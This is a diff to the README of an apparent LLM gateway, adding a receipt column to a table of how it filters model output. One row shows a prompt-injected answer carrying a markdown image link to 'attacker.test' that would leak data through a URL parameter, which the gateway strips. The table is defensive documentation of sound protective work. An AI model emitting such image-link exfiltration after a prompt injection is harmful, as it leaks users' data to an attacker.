@@ -82,11 +82,11 @@ The [Docker lab](lab/README.md) adds what one machine cannot show: the applicati
 | a model that is not on the key's list | answers `403 MODEL_NOT_ALLOWED`; nothing leaves | `block` |
 | anything, while the disk is full | answers `503 AUDIT_UNAVAILABLE`; nothing leaves | — |
 
-| The model answers… | The application gets… |
-| --- | --- |
-| `Done ![x](https://attacker.test/?d=…)`, after a prompt injection | `Done [image removed]` |
-| `[docs](https://unknown.test/…)` | `docs`; links to hosts on the allowlist stay |
-| a provider key, split across two stream events | the stream cut with an error event |
+| The model answers… | The application gets… | The receipt says |
+| --- | --- | --- |
+| `Done ![x](https://attacker.test/?d=…)`, after a prompt injection | `Done [image removed]` | `{"images_removed": 1}`, never the URL |
+| `[docs](https://unknown.test/…)` | `docs`; links to hosts on the allowlist stay | `{"links_removed": 1}` |
+| a provider key, split across two stream events | the stream cut with an error event | `aborted`, `secret` |
 
 Every decision is a line in a hash-chained, Ed25519-signed log that never holds prompt content. `resguardo verify-log` checks it with the public key.
 
